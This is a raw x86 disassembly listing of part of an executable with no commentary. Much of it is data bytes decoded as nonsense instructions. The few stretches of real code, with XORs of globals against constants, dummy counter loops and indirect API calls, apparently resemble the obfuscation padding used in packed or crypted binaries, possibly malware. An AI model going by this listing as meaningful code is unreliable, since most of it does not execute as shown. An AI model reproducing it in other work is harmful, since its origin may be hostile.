  40b7e2:	ja     0x40b7fd
  40b7e4:	xchg   esp,eax
  40b7e5:	scas   al,BYTE PTR es:[edi]
  40b7e6:	inc    ecx
  40b7e7:	sub    esi,DWORD PTR [ebx]
  40b7e9:	dec    ecx
  40b7ea:	pushf  
  40b7eb:	fdiv   st,st(6)
  40b7ed:	and    al,0x7a
  40b7ef:	push   ebp
  40b7f0:	sub    DWORD PTR [ebp-0x11],edi
  40b7f3:	pop    ecx
  40b7f4:	enter  0xa520,0x82
  40b7f8:	(bad)  
  40b7f9:	jge    0x40b7be
  40b7fb:	je     0x40b79c
  40b7fd:	jne    0x40b7ce
  40b7ff:	imul   esp,ebx,0xffffffca
  40b802:	test   al,0x9d
  40b804:	sub    esp,DWORD PTR [esi]
  40b806:	or     ch,cl
  40b808:	loopne 0x40b79a
  40b80a:	cmp    al,0x26
  40b80c:	jg     0x40b800
  40b80e:	sub    ah,dl
  40b810:	push   esp
  40b811:	sub    ebx,ebx
  40b813:	push   ebx
  40b814:	ins    BYTE PTR es:[edi],dx
  40b815:	jmp    0x1f2a:0x8da067d5
  40b81c:	bnd jns 0x40b875
  40b81f:	inc    edx
  40b820:	adc    ecx,DWORD PTR [edx]
  40b822:	cmp    ch,BYTE PTR [ebx+ebp*8]
  40b825:	and    ecx,DWORD PTR [esi]
  40b827:	jb     0x40b89d
  40b829:	mov    ecx,0x4207a687
  40b82e:	ins    DWORD PTR es:[edi],dx
  40b82f:	mov    ah,0xa9
  40b831:	pop    esi
  40b832:	sbb    edx,DWORD PTR fs:[ecx+0x66]
  40b836:	adc    ch,BYTE PTR [ebx]
  40b838:	sub    DWORD PTR [ebp+0x7c8c9266],eax
  40b83e:	lea    ebp,[ebx-0x1a]
  40b841:	sbb    al,0x2a
  40b843:	fadd   DWORD PTR [ebx-0x6d26ce98]
  40b849:	enter  0x9cb4,0x10
  40b84d:	div    DWORD PTR fs:[ebx-0x48]
  40b851:	aad    0xdb
  40b853:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b854:	shl    BYTE PTR [esi-0x46],cl
  40b857:	stos   DWORD PTR es:[edi],eax
  40b858:	sti    
  40b859:	ret    
  40b85a:	invd   
  40b85c:	stos   DWORD PTR es:[edi],eax
  40b85d:	int3   
  40b85e:	loope  0x40b822
  40b860:	pop    ss
  40b861:	outs   dx,DWORD PTR ds:[esi]
  40b862:	mov    al,ds:0xea325b58
  40b867:	sub    ecx,DWORD PTR [esi-0x69]
  40b86a:	xchg   BYTE PTR [edi-0x2f],cl
  40b86d:	mov    dh,0xdd
  40b86f:	das    
  40b870:	ror    ebx,1
  40b872:	stos   DWORD PTR es:[edi],eax
  40b873:	and    BYTE PTR [eax-0x17acd9e6],bl
  40b879:	(bad)  
  40b87a:	mov    esi,0xd63b7ca6
  40b87f:	ds cld 
  40b881:	fs scas al,BYTE PTR es:[edi]
  40b883:	nop
  40b884:	ret    0xeee1
  40b887:	retf   
  40b888:	fld    TBYTE PTR [edi*1-0x144fc5a8]
  40b88f:	and    eax,0x84aebd17
  40b894:	iret   
  40b895:	popf   
  40b896:	jmp    0x36a3ecd4
  40b89b:	hlt    
  40b89c:	sub    BYTE PTR [edi],0x2d
  40b89f:	fnstenv [eax+ebp*2]
  40b8a2:	cmp    DWORD PTR [ebx],edi
  40b8a4:	jmp    0x40b859
  40b8a6:	jbe    0x40b8be
  40b8a8:	ja     0x40b905
  40b8aa:	retf   0x8f74
  40b8ad:	call   0xa68a9f23
  40b8b2:	sub    BYTE PTR [esi],dl
  40b8b4:	and    bl,dl
  40b8b6:	xchg   ebp,eax
  40b8b7:	lds    esp,FWORD PTR [esi-0x37a4de59]
  40b8bd:	test   BYTE PTR [edx+0x41],0x27
  40b8c1:	add    al,0xf4
  40b8c3:	cmp    BYTE PTR [eax+0x726990b6],dl
  40b8c9:	stos   BYTE PTR es:[edi],al
  40b8ca:	out    dx,al
  40b8cb:	mov    dh,0xe4
  40b8cd:	retf   0x213d
  40b8d0:	add    bh,BYTE PTR [edx+0x7d5bf1d2]
  40b8d6:	cmp    ecx,esp
  40b8d8:	(bad)  
  40b8d9:	xchg   edi,eax
  40b8da:	fisub  DWORD PTR ds:0x6f72d317
  40b8e0:	jb     0x40b869
  40b8e2:	jmp    0xf56f2c63
  40b8e7:	sbb    al,0x49
  40b8e9:	in     eax,dx
  40b8ea:	imul   esp
  40b8ec:	cli    
  40b8ed:	shr    BYTE PTR [esi-0x75],cl
  40b8f0:	cmp    al,0x34
  40b8f2:	out    dx,eax
  40b8f3:	mul    DWORD PTR [ecx]
  40b8f5:	xchg   ebx,eax
  40b8f6:	ins    BYTE PTR es:[edi],dx
  40b8f7:	xchg   ebp,edi
  40b8f9:	retf   0x7589
  40b8fc:	in     al,dx
  40b8fd:	sbb    ecx,DWORD PTR ds:0x430546
  40b903:	mov    DWORD PTR [ebp-0x8],esi
  40b906:	xor    ecx,DWORD PTR ds:0x430496
  40b90c:	mov    ecx,DWORD PTR [ebp-0x18]
  40b90f:	neg    DWORD PTR ds:0x43049e
  40b915:	xor    ecx,eax
  40b917:	sbb    DWORD PTR ds:0x4304a6,0x1292
  40b921:	xor    edi,edi
  40b923:	add    ecx,ebx
  40b925:	mov    DWORD PTR [ebp-0x20],ecx
  40b928:	mov    DWORD PTR ds:0x42ee28,edi
  40b92e:	mov    eax,DWORD PTR [ebp-0x20]
  40b931:	je     0x40c70d
  40b937:	xor    DWORD PTR ds:0x42ee2c,edi
  40b93d:	mov    eax,DWORD PTR [ebp-0x4]
  40b940:	xor    eax,0x7510856
  40b945:	xor    DWORD PTR ds:0x42ee20,0x27f1
  40b94f:	jmp    0x40baad
  40b954:	mov    edx,ds
  40b956:	inc    edi
  40b957:	aam    0x59
  40b959:	push   ebp
  40b95a:	mov    ebp,0x1f44e87a
  40b95f:	add    BYTE PTR [ebx],0x7c
  40b962:	aas    
  40b963:	idiv   DWORD PTR [esi]
  40b965:	clc    
  40b966:	jle    0x40b9e6
  40b968:	aas    
  40b969:	jg     0x40b9e9
  40b96b:	jle    0x40b93d
  40b96d:	mov    dl,BYTE PTR [edx-0x2c1ce27e]
  40b973:	mov    ds:0xc196b9ff,eax
  40b978:	ret    0xbcc0
  40b97b:	sub    ebx,DWORD PTR [esp+ecx*1+0x2c]
  40b97f:	cmp    BYTE PTR [ecx+0x5e],dh
  40b982:	and    ebp,DWORD PTR [ecx-0x41]
  40b985:	aam    0x16
  40b987:	jmp    0x40b9c4
  40b989:	mov    ds:0xe3be3402,eax
  40b98e:	popf   
  40b98f:	dec    edx
  40b990:	cmp    edx,esi
  40b992:	pop    ecx
  40b993:	jecxz  0x40b9d1
  40b995:	xor    al,0x1d
  40b997:	les    esi,FWORD PTR [ecx-0x44eb769]
  40b99d:	je     0x40b989
  40b99f:	pop    ebp
  40b9a0:	sbb    bh,ch
  40b9a2:	hlt    
  40b9a3:	mov    cl,0xd0
  40b9a5:	cmp    DWORD PTR ds:0xb30e1d,ebp
  40b9ab:	imul   ecx,DWORD PTR [edx-0xf],0x4e8445f8
  40b9b2:	daa    
  40b9b3:	(bad)  
  40b9b4:	(bad)  
  40b9b5:	dec    eax
  40b9b6:	xor    DWORD PTR [ecx],esi
  40b9b8:	lds    edi,FWORD PTR [ecx-0x30]
  40b9bb:	lds    edi,FWORD PTR [edi+0x53]
  40b9be:	add    esp,DWORD PTR [ecx]
  40b9c0:	jle    0x40b9a2
  40b9c2:	xchg   BYTE PTR ds:[esi+0x1b],bh
  40b9c6:	popa   
  40b9c7:	popa   
  40b9c8:	jecxz  0x40b98f
  40b9ca:	loop   0x40b9e5
  40b9cc:	mov    ebp,DWORD PTR [ebp+0x38f2a10]
  40b9d2:	icebp  
  40b9d3:	push   esi
  40b9d4:	cmp    eax,0x62536dc2
  40b9d9:	jmp    0xac11c200
  40b9de:	xchg   ebx,eax
  40b9df:	jg     0x40b9a9
  40b9e1:	mov    dl,0xd5
  40b9e3:	mov    eax,ds:0xde643be3
  40b9e8:	test   BYTE PTR [edi],cl
  40b9ea:	mov    al,gs:0x69c460f0
  40b9f0:	out    dx,eax
  40b9f1:	dec    ebp
  40b9f2:	(bad)  
  40b9f3:	ja     0x40b9c3
  40b9f5:	inc    ecx
  40b9f6:	lahf   
  40b9f7:	sub    dh,BYTE PTR [edi-0x70]
  40b9fa:	mov    eax,ds:0xee29f214
  40b9ff:	and    DWORD PTR [esi+0x2c2611d9],ecx
  40ba05:	sub    eax,0xee2ca9d2
  40ba0a:	in     al,dx
  40ba0b:	push   eax
  40ba0c:	ss inc ebx
  40ba0e:	xor    DWORD PTR [ecx],ebx
  40ba10:	dec    eax
  40ba11:	(bad)  
  40ba12:	dec    DWORD PTR [ebp+ecx*8+0x1f]
  40ba16:	cli    
  40ba17:	cmc    
  40ba18:	mov    ch,0xa3
  40ba1a:	cwde   
  40ba1b:	paddb  mm1,QWORD PTR [ecx+0x7d8f4315]
  40ba22:	xchg   ecx,eax
  40ba23:	ds test ah,0xe6
  40ba27:	add    BYTE PTR [esi],bh
  40ba29:	enter  0x2e36,0x4c
  40ba2d:	loopne 0x40b9e6
  40ba2f:	mov    cl,0xc8
  40ba31:	loop   0x40b9b6
  40ba33:	jl     0x40b9df
  40ba35:	dec    ecx
  40ba36:	(bad)
  40ba3b:	cmp    eax,0x321e9645
  40ba40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba41:	mov    dl,0xbe
  40ba43:	in     al,0xa0
  40ba45:	pushf  
  40ba46:	int3   
  40ba47:	subps  xmm3,XMMWORD PTR [edi]
  40ba4a:	jle    0x40b9d8
  40ba4c:	outs   dx,BYTE PTR ds:[esi]
  40ba4d:	pop    esp
  40ba4e:	cmp    BYTE PTR [edx+0x440bf8d5],ch
  40ba54:	push   esp
  40ba55:	lods   al,BYTE PTR ds:[esi]
  40ba56:	outs   dx,BYTE PTR ds:[esi]
  40ba57:	inc    edi
  40ba58:	mov    cs,WORD PTR [eax]
  40ba5a:	in     al,0xff
  40ba5c:	dec    ecx
  40ba5d:	or     esi,DWORD PTR ds:[eax-0x1d64a436]
  40ba64:	or     al,0x80
  40ba66:	aaa    
  40ba67:	jae    0x40ba37
  40ba69:	pop    esp
  40ba6a:	mov    cl,0xed
  40ba6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba6d:	jmp    0x9a30:0xe240c082
  40ba74:	mov    al,0xc8
  40ba76:	lahf   
  40ba77:	mov    bl,0xf7
  40ba79:	sub    eax,0x2b5585bb
  40ba7e:	cdq    
  40ba7f:	pop    esp
  40ba80:	mov    DWORD PTR [esi-0x48acf786],esi
  40ba86:	push   es
  40ba87:	ret    0xa082
  40ba8a:	xchg   ebx,eax
  40ba8b:	ins    DWORD PTR es:[edi],dx
  40ba8c:	test   BYTE PTR [ecx+0x3d9a2b23],bh
  40ba92:	inc    eax
  40ba93:	into   
  40ba94:	mov    ah,0x61
  40ba96:	push   esi
  40ba97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba98:	push   edx
  40ba99:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40ba9b:	xor    eax,0x43ec00e9
  40baa0:	inc    ebx
  40baa1:	outs   dx,DWORD PTR ds:[esi]
  40baa2:	call   0x33d6:0xb15be413
  40baa9:	mov    cl,0x7c
  40baab:	and    ebx,eax
  40baad:	add    eax,ebx
  40baaf:	mov    DWORD PTR ds:0x42ee20,0x3d16
  40bab9:	cmp    edi,eax
  40babb:	mov    DWORD PTR ds:0x430496,0x64f1
  40bac5:	jne    0x40c296
  40bacb:	or     DWORD PTR ds:0x42ee28,0x42ee14
  40bad5:	push   DWORD PTR [ebp+0x8]
  40bad8:	call   0x40a1ba
  40badd:	mov    DWORD PTR [ebp-0x20],eax
  40bae0:	mov    eax,DWORD PTR [ebp-0x4]
  40bae3:	mov    ecx,DWORD PTR [ebp-0x20]
  40bae6:	and    DWORD PTR ds:0x42ee1c,0x0
  40baf0:	mov    esi,DWORD PTR ds:0x42ee1c
  40baf6:	inc    esi
  40baf7:	mov    DWORD PTR ds:0x42ee1c,esi
  40bafd:	cmp    DWORD PTR ds:0x42ee1c,0x22
  40bb04:	jne    0x40bb1b
  40bb0a:	push   DWORD PTR [ebp-0x1c]
  40bb0d:	push   DWORD PTR [ebp-0x24]
  40bb10:	push   0x6795
  40bb15:	call   DWORD PTR ds:0x42ebd4
  40bb1b:	cmp    DWORD PTR ds:0x42ee1c,0x1d
  40bb22:	jb     0x40baf0
  40bb28:	mov    esi,DWORD PTR ds:0x430556
  40bb2e:	xor    DWORD PTR ds:0x4304b6,esi
  40bb34:	mov    esi,0x7510856
  40bb39:	add    DWORD PTR ds:0x4304b2,0x43049a
  40bb43:	xor    eax,esi
  40bb45:	jmp    0x40bca3
  40bb4a:	jns    0x40bb9f
  40bb4c:	mov    ah,0x6a
  40bb4e:	pop    esp
  40bb4f:	ins    DWORD PTR es:[edi],dx
  40bb50:	jns    0x40bbb7
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	iret   
  40bb54:	loopne 0x40bbad
  40bb56:	or     esi,DWORD PTR [ebx-0x600d25a]
  40bb5c:	jle    0x40bbdc
  40bb5e:	aas    
  40bb5f:	jg     0x40bbdf
  40bb61:	jle    0x40bb8d
  40bb63:	adc    al,0xa9
  40bb65:	fcom   DWORD PTR [esi+0x7eb8680c]
  40bb6b:	int3   
  40bb6c:	not    DWORD PTR [ebx-0x13]
  40bb6f:	inc    ebp
  40bb70:	ds add al,0x78
  40bb73:	outs   dx,DWORD PTR ds:[esi]
  40bb74:	call   FWORD PTR [edi+0x5dec39b8]
  40bb7a:	sbb    DWORD PTR [edi+edi*2+0x52d7d9ed],ebp
  40bb81:	sub    eax,0xacb26196
  40bb86:	aam    0x7e
  40bb88:	xchg   ecx,eax
  40bb89:	or     bl,cl
  40bb8b:	jg     0x40bbdb
  40bb8d:	ss jmp 0x40bb7a
  40bb90:	mov    DWORD PTR [eax-0x39],esp
  40bb93:	or     eax,0x1315e30b
  40bb98:	imul   eax,DWORD PTR [ebx-0x3306aa34],0x3d4bd7cb
  40bba2:	jmp    0x40bb46
  40bba4:	jmp    0x40bb92
  40bba6:	dec    ebp
  40bba7:	lahf   
  40bba8:	mov    ds:0x25813de9,eax
  40bbad:	inc    edi
  40bbae:	xchg   ecx,eax
  40bbaf:	cdq    
  40bbb0:	sub    al,0x7c
  40bbb2:	lods   eax,DWORD PTR ds:[esi]
  40bbb3:	xor    DWORD PTR [ebx+0x50],edx
  40bbb6:	bound  ebx,QWORD PTR [edx-0x3f82372d]
  40bbbc:	inc    edi
  40bbbd:	and    ebx,DWORD PTR [eax-0x51]
  40bbc0:	add    ch,ah
  40bbc2:	sub    DWORD PTR [edx+0x5f],eax
  40bbc5:	add    esp,ecx
  40bbc7:	fild   WORD PTR [ecx+0x34a32f30]
  40bbcd:	and    al,0x66
  40bbcf:	fnsave [esi+0x7c]
  40bbd2:	jmp    0x40bbb8
  40bbd4:	and    DWORD PTR [edx],eax
  40bbd6:	les    ebp,FWORD PTR [esi-0x75]
  40bbd9:	loope  0x40bc15
  40bbdb:	mov    ch,0x83
  40bbdd:	xor    eax,0x1b44b831
  40bbe2:	(bad)  
  40bbe4:	mov    ebx,0xe7592a91
  40bbe9:	xchg   ebp,eax
  40bbea:	cmp    DWORD PTR [ebx],ebx
  40bbec:	test   eax,0xab804f6
  40bbf1:	push   edx
  40bbf2:	xor    al,al
  40bbf4:	aam    0x45
  40bbf6:	or     dh,BYTE PTR [esi+edx*8-0x5d]
  40bbfa:	dec    edx
  40bbfb:	sub    eax,0xce43d041
  40bc00:	mov    DWORD PTR [ebp-0x55e138e4],ebp
  40bc06:	xor    DWORD PTR [edx+0x1],ebx
  40bc09:	push   es
  40bc0a:	ins    BYTE PTR es:[edi],dx
  40bc0b:	push   ebx
  40bc0c:	or     eax,0x1a185ca4
  40bc11:	test   ch,0x3e
  40bc14:	sbb    BYTE PTR [ebp-0x14],bh
  40bc17:	fld    QWORD PTR [esi]
  40bc19:	pop    ss
  40bc1a:	jno    0x40bc22
  40bc1c:	std    
  40bc1d:	add    al,0x5f
  40bc1f:	mov    bl,0x6a
  40bc21:	jp     0x40bc44
  40bc23:	xor    BYTE PTR [edi+0x33],dl
  40bc26:	mov    esp,0xd13f8e6e
  40bc2b:	jo     0x40bc43
  40bc2d:	std    
  40bc2e:	push   esp
  40bc2f:	data16 or al,0xd1
  40bc32:	xchg   edx,eax
  40bc33:	pop    edx
  40bc34:	mov    ch,0x15
  40bc36:	popa   
  40bc37:	sub    BYTE PTR [eax],0xe0
  40bc3a:	sub    al,BYTE PTR [edx+0x26]
  40bc3d:	les    edi,FWORD PTR [edx+0x216f32f5]
  40bc43:	outs   dx,DWORD PTR ds:[esi]
  40bc44:	ins    BYTE PTR es:[di],dx
  40bc46:	dec    ebx
  40bc47:	xor    DWORD PTR ds:0x38988fd5,0xfffffff2
  40bc4e:	outs   dx,DWORD PTR ds:[esi]
  40bc4f:	pop    ecx
  40bc50:	add    dl,BYTE PTR [ecx-0x3bc56c69]
  40bc56:	mov    cl,0x22
  40bc58:	fwait
  40bc59:	cmp    bl,BYTE PTR [ecx]
  40bc5b:	dec    eax
  40bc5c:	mov    bl,0x8f
  40bc5e:	jle    0x40bc7c
  40bc60:	fldenv [edi+0x33]
  40bc63:	xor    eax,0x4d8e09b3
  40bc68:	mov    ecx,0xa2d1a411
  40bc6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bc6e:	stc    
  40bc6f:	mov    bh,0x7c
  40bc71:	stos   BYTE PTR es:[edi],al
  40bc72:	inc    esi
  40bc73:	imul   ebx,ebp,0xffffffec
  40bc76:	(bad)  
  40bc77:	loope  0x40bc36
  40bc79:	jle    0x40bc6e
  40bc7b:	push   ecx
  40bc7c:	cs aas 
  40bc7e:	out    dx,eax
  40bc7f:	mov    eax,ds:0x4e6e76e3
  40bc84:	sub    esi,DWORD PTR [ebp+0xf]
  40bc87:	inc    ebp
  40bc88:	sub    ch,cl
  40bc8a:	cmp    eax,ecx
  40bc8c:	inc    eax
  40bc8d:	xor    BYTE PTR [ebx+0x2e],bl
  40bc90:	inc    ebx
  40bc91:	or     eax,0xd3138fa5
  40bc96:	mov    WORD PTR [edx],ss
  40bc98:	loop   0x40bc43
  40bc9a:	fimul  WORD PTR [eax+edi*4-0x63]
  40bc9e:	jo     0x40bcaf
  40bca0:	adc    al,0x68
  40bca2:	rol    DWORD PTR [ebx],1
  40bca4:	ret    
  40bca5:	cmp    ecx,eax
  40bca7:	mov    DWORD PTR ds:0x430552,0x373b
  40bcb1:	je     0x40c6f1
  40bcb7:	sbb    DWORD PTR ds:0x43054e,0x42ee30
  40bcc1:	push   DWORD PTR [ebp-0x20]
  40bcc4:	and    DWORD PTR ds:0x4304be,0x430546
  40bcce:	push   DWORD PTR [ebp+0x8]
  40bcd1:	call   0x40a7ab
  40bcd6:	and    DWORD PTR ds:0x4304c2,0x0
  40bce0:	jmp    0x40bcf2
  40bce5:	mov    ecx,DWORD PTR ds:0x4304c2
  40bceb:	inc    ecx
  40bcec:	mov    DWORD PTR ds:0x4304c2,ecx
  40bcf2:	cmp    DWORD PTR ds:0x4304c2,0x1e
  40bcf9:	jae    0x40bd40
  40bcff:	cmp    DWORD PTR ds:0x4304c2,0xd
  40bd06:	jne    0x40bd1f
  40bd0c:	push   DWORD PTR [ebp-0xc]
  40bd0f:	push   0x4304a2
  40bd14:	push   0x2a1f
  40bd19:	call   DWORD PTR ds:0x42ea2c
  40bd1f:	cmp    DWORD PTR ds:0x4304c2,0xc
  40bd26:	jne    0x40bd3b
  40bd2c:	xor    ecx,ecx
  40bd2e:	add    ecx,DWORD PTR ds:0x4304c2
  40bd34:	inc    ecx
  40bd35:	mov    DWORD PTR ds:0x4304c2,ecx
  40bd3b:	jmp    0x40bce5
  40bd40:	mov    DWORD PTR [ebp-0x14],eax
  40bd43:	xor    DWORD PTR ds:0x42e772,0x3e11
  40bd4d:	mov    eax,DWORD PTR [ebp-0x4]
  40bd50:	add    ecx,DWORD PTR ds:0x430496
  40bd56:	mov    ecx,DWORD PTR [ebp-0x14]
  40bd59:	xor    eax,esi
  40bd5b:	or     DWORD PTR ds:0x43055a,0x430552
  40bd65:	add    eax,ebx
  40bd67:	cmp    ecx,eax
  40bd69:	mov    DWORD PTR ds:0x42ee10,0x41d
  40bd73:	je     0x40c6f1
  40bd79:	add    eax,ecx
  40bd7b:	mov    eax,DWORD PTR [ebp-0x14]
  40bd7e:	mov    DWORD PTR ds:0x4304b2,0x19
  40bd88:	cmp    DWORD PTR ds:0x4304b2,0x0
  40bd8f:	je     0x40bdbf
  40bd95:	cmp    DWORD PTR ds:0x4304b2,0x1b
  40bd9c:	jne    0x40bdad
  40bda2:	push   0x2712
  40bda7:	call   DWORD PTR ds:0x42ea30
  40bdad:	mov    ecx,DWORD PTR ds:0x4304b2
  40bdb3:	dec    ecx
  40bdb4:	mov    DWORD PTR ds:0x4304b2,ecx
  40bdba:	jmp    0x40bd88
  40bdbf:	mov    eax,DWORD PTR [eax+0x18]
  40bdc2:	sub    ecx,DWORD PTR ds:0x43055a
  40bdc8:	mov    DWORD PTR [ebp-0x20],eax
  40bdcb:	jmp    0x40bf29
  40bdd0:	fld    QWORD PTR [ebx-0x66]
  40bdd3:	xor    bl,BYTE PTR [ebx+ecx*8+0x503d5d5d]
  40bdda:	cmp    al,0x3b
  40bddc:	push   ss
  40bddd:	and    al,0xec
  40bddf:	xlat   BYTE PTR ds:[ebx]
  40bde0:	mov    al,0xfa
  40bde2:	jle    0x40be62
  40bde4:	aas    
  40bde5:	jg     0x40be65
  40bde7:	jle    0x40be3e
  40bde9:	add    al,0x44
  40bdeb:	cmp    DWORD PTR [ecx],edx
  40bded:	pop    ecx
  40bdee:	out    dx,eax
  40bdef:	out    dx,eax
  40bdf0:	cwde   
  40bdf1:	xchg   ebp,eax
  40bdf2:	jmp    0xfae5:0xa3ac2033
  40bdf9:	dec    ebp
  40bdfa:	aam    0xa0
  40bdfc:	jo     0x40bddf
  40bdfe:	fistp  DWORD PTR [esi+ebp*4+0x44]
  40be02:	push   ds
  40be03:	sar    DWORD PTR [esi+0x4c],0xe1
  40be07:	or     ebp,ecx
  40be09:	add    BYTE PTR [edx+edi*8],bh
  40be0c:	iret   
  40be0d:	fsub   st,st(4)
  40be0f:	sahf   
  40be10:	lods   eax,DWORD PTR ds:[esi]
  40be11:	push   es
  40be12:	xor    al,0x53
  40be14:	dec    esp
  40be15:	jmp    0x6b67:0x4a300a00
  40be1c:	ror    BYTE PTR [edx-0x48],1
  40be1f:	shl    dh,1
  40be21:	das    
  40be22:	pusha  
  40be23:	nop
  40be24:	adc    dl,BYTE PTR [eax+0x52b50ac6]
  40be2a:	sar    BYTE PTR [edx-0x51118c90],1
  40be30:	shl    ecx,1
  40be32:	jne    0x40be9c
  40be34:	scas   al,BYTE PTR es:[edi]
  40be35:	repz sub eax,esi
  40be38:	add    ebx,eax
  40be3a:	push   edi
  40be3b:	pop    edi
  40be3c:	jbe    0x40bdc6
  40be3e:	adc    bl,0x30
  40be41:	dec    esp
  40be42:	jo     0x40be98
  40be44:	addr16 fs pop ebx
  40be47:	or     eax,0x6e265c78
  40be4c:	imul   ebp,DWORD PTR [ecx-0x3c],0xffffff9e
  40be50:	sub    al,0x3e
  40be52:	adc    eax,0x16929cfc
  40be57:	dec    ecx
  40be58:	adc    cl,BYTE PTR [ecx-0x30]
  40be5b:	and    al,0x58
  40be5d:	and    BYTE PTR [ebx-0xa],dh
  40be60:	aas    
  40be61:	mov    ebx,DWORD PTR [ebx-0x69]
  40be64:	jmp    0x4c4c:0x162052ff
  40be6b:	js     0x40be1d
  40be6d:	shr    cl,0xe9
  40be70:	shl    ebp,1
  40be72:	scas   al,BYTE PTR es:[edi]
  40be73:	push   esi
  40be74:	mov    edi,DWORD PTR [esi+ebx*4+0x10]
  40be78:	sbb    al,0x16
  40be7a:	xor    al,0xca
  40be7c:	(bad)  
  40be7d:	xchg   esi,eax
  40be7e:	mov    ebx,0x1c6072ea
  40be83:	adc    al,0xa4
  40be85:	push   es
  40be86:	inc    edi
  40be87:	shr    BYTE PTR [ebp+0x3f],cl
  40be8a:	je     0x40be98
  40be8c:	arpl   WORD PTR [ecx],di
  40be8e:	(bad)  [edi+0x4f5c8d17]
  40be94:	sub    DWORD PTR [eax],esp
  40be96:	inc    ecx
  40be97:	ins    DWORD PTR es:[edi],dx
  40be98:	test   BYTE PTR [eax+0x3ce141c4],ch
  40be9e:	fcmovnu st,st(5)
  40bea0:	mov    ecx,0x74b27aa9
  40bea5:	shr    dl,0x89
  40bea8:	and    ch,BYTE PTR [edi-0x1e803c0b]
  40beae:	mov    ebp,DWORD PTR [ebp+edx*4-0x2822dce9]
  40beb5:	fdivr  DWORD PTR [edi]
  40beb7:	xor    ebp,0x5f
  40beba:	shl    DWORD PTR [ecx],cl
  40bebc:	jge    0x40be40
  40bebe:	into   
  40bebf:	paddd  mm2,QWORD PTR [eax+0x17]
  40bec3:	loope  0x40beb3
  40bec5:	retf   0xe8ce
  40bec8:	and    eax,0xad1c43b7
  40becd:	lea    ecx,[ebx]
  40becf:	mov    WORD PTR [esi+0x56],cs
  40bed2:	xchg   DWORD PTR [esi],eax
  40bed4:	jo     0x40bf05
  40bed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bed7:	lahf   
  40bed8:	push   ds
  40bed9:	(bad)  
  40beda:	pop    esp
  40bedb:	inc    esp
  40bedc:	push   esp
  40bedd:	hlt    
  40bede:	dec    edi
  40bedf:	push   ebx
  40bee0:	pop    esi
  40bee1:	popf   
  40bee2:	in     eax,dx
  40bee3:	pop    ecx
  40bee4:	sub    bl,ah
  40bee6:	sub    DWORD PTR [eax+0x7b819a59],esp
  40beec:	mov    BYTE PTR [eax+0x31],ch
  40beef:	cdq    
  40bef0:	jle    0x40be80
  40bef2:	nop
  40bef3:	mov    ecx,?
  40bef5:	repz fidivr DWORD PTR [esp+ecx*8+0x44]
  40befa:	mov    ds:0xdc01ea8d,eax
  40beff:	cmp    BYTE PTR [ebp*8+0x2b6a962e],ah
  40bf06:	or     eax,0x87db3fd9
  40bf0b:	cwde   
  40bf0c:	cmp    ah,BYTE PTR [edi+0x7d2dc87a]
  40bf12:	in     eax,0x1c
  40bf14:	aaa    
  40bf15:	mov    BYTE PTR [ebp-0x7adcefcb],bh
  40bf1b:	cmp    DWORD PTR [ebx+0x56],ebp
  40bf1e:	outs   dx,BYTE PTR ds:[esi]
  40bf1f:	mov    ebp,0xaff7eb30
  40bf24:	rcr    ebp,cl
  40bf26:	stc    
  40bf27:	and    BYTE PTR [ebp-0x7413ba75],dh
  40bf2d:	dec    ebp
  40bf2e:	or     BYTE PTR [ecx+0x4304a61d],al
  40bf34:	add    BYTE PTR [esi+ecx*1+0x59e90000],dl
  40bf3b:	add    DWORD PTR [eax],eax
  40bf3d:	add    ah,bl
  40bf3f:	(bad)  
  40bf40:	lods   eax,DWORD PTR ds:[esi]
  40bf41:	dec    edi
  40bf42:	ins    DWORD PTR es:[edi],dx
  40bf43:	jge    0x40bf41
  40bf45:	popf   
  40bf46:	mov    dh,0x46
  40bf48:	(bad)  
  40bf49:	scas   al,BYTE PTR es:[edi]
  40bf4a:	scas   al,BYTE PTR es:[edi]
  40bf4b:	cld    
  40bf4c:	mov    esi,0x7efc71c5
  40bf51:	jle    0x40bf92
  40bf53:	jg     0x40bfd3
  40bf55:	jle    0x40bed9
  40bf57:	inc    ebx
  40bf58:	push   ds
  40bf59:	adc    DWORD PTR [ebx],0x6b
  40bf5c:	(bad)  
  40bf5d:	mov    esp,DWORD PTR [ebp+0x3e]
  40bf60:	rcr    BYTE PTR [eax-0x1b49b991],1
  40bf66:	jo     0x40bfe6
  40bf68:	sub    DWORD PTR [ebx-0x144eacbf],0xe4c4a7bb
  40bf72:	ret    
  40bf73:	out    dx,eax
  40bf74:	cs xor al,0x91
  40bf77:	mov    ebp,0xe568b5bb
  40bf7c:	inc    esp
  40bf7d:	cli    
  40bf7e:	add    al,0x1c
  40bf80:	mov    dl,0x4f
  40bf82:	dec    ebx
  40bf83:	sub    ah,ah
  40bf85:	dec    eax
  40bf86:	and    DWORD PTR cs:[ebx],ebx
  40bf89:	push   esi
  40bf8a:	test   BYTE PTR [ebx-0x4dcce8e1],0x85
  40bf91:	clc    
  40bf92:	push   esi
  40bf93:	leave  
  40bf94:	lahf   
  40bf95:	jmp    0xf4813c22
  40bf9a:	push   ss
  40bf9b:	cmp    DWORD PTR [edi+0x23],esp
  40bf9e:	into   
  40bf9f:	push   ebx
  40bfa0:	gs sbb eax,0x7f210147
  40bfa6:	sbb    eax,0x55707ef4
  40bfab:	xor    BYTE PTR [edi-0x2c6bfdc5],dh
  40bfb1:	push   es
  40bfb2:	(bad)  
  40bfb3:	jae    0x40bff3
  40bfb5:	adc    DWORD PTR [edi+0x56],edx
  40bfb8:	jle    0x40bf52
  40bfba:	cmp    eax,0xec4be79
  40bfbf:	arpl   WORD PTR [ecx-0x61],bx
  40bfc2:	mov    gs,eax
  40bfc4:	shr    ebx,0xf9
  40bfc7:	(bad)  
  40bfc8:	push   edx
  40bfc9:	mov    ds:0xa942538d,eax
  40bfce:	jge    0x40bfb8
  40bfd0:	pop    edx
  40bfd1:	jno    0x40c011
  40bfd3:	dec    edi
  40bfd4:	pop    esp
  40bfd5:	ins    DWORD PTR es:[edi],dx
  40bfd6:	test   DWORD PTR [ebx+0x75a9d372],ebx
  40bfdc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfdd:	xor    eax,0x9456d2cd
  40bfe2:	inc    esp
